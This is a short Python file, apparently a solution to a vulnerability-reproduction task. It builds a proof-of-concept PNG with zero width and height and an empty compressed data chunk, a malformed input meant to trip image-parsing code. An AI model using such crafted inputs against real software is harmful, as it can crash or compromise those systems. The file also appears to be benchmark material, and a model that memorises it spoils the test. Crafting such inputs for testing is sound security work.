import binascii
import zlib

class Solution:
    def solve(self, src_path: str) -> bytes:
        # PNG signature
        png_sig = b'\x89PNG\r\n\x1a\n'
        
        # IHDR chunk
        ihdr_length = b'\x00\x00\x00\x0d'
        ihdr_type = b'IHDR'
        width = b'\x00\x00\x00\x00'
        height = b'\x00\x00\x00\x00'
        bit_depth = b'\x08'
        color_type = b'\x00'  # grayscale
        compression = b'\x00'
        filter_method = b'\x00'
        interlace = b'\x00'
        ihdr_data = width + height + bit_depth + color_type + compression + filter_method + interlace
        ihdr_crc_input = b'IHDR' + ihdr_data
        ihdr_crc = binascii.crc32(ihdr_crc_input).to_bytes(4, 'big')
        ihdr_chunk = ihdr_length + ihdr_type + ihdr_data + ihdr_crc
        
        # IDAT chunk with empty zlib stream
        empty_pixels = b''
        idat_data = zlib.compress(empty_pixels)
        idat_length = len(idat_data).to_bytes(4, 'big')
        idat_type = b'IDAT'
        idat_crc_input = b'IDAT' + idat_data
        idat_crc = binascii.crc32(idat_crc_input).to_bytes(4, 'big')
        idat_chunk = idat_length + idat_type + idat_data + idat_crc
        
        # IEND chunk
        iend_length = b'\x00\x00\x00\x00'
        iend_type = b'IEND'
        iend_data = b''
        iend_crc_input = b'IEND' + iend_data
        iend_crc = binascii.crc32(iend_crc_input).to_bytes(4, 'big')
        iend_chunk = iend_length + iend_type + iend_data + iend_crc
        
        # Combine all parts
        poc = png_sig + ihdr_chunk + idat_chunk + iend_chunk
        return poc